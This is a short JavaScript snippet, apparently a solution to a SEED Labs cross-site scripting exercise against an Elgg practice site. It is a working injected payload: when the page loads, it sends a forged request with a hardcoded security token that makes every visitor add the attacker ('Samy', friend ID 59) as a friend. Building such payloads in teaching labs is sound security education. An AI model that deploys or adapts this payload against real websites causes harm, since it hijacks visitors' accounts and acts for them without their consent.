<script type="text/javascript">
window.onload = function () {
    var Ajax=null;
    // XXXX is to be filled with a URL that 
    // triggers the request to add Samy as a friend
    var sendurl="http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1698477014&__elgg_token=QldVZFn_gZRiBGtY6egDAg";
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
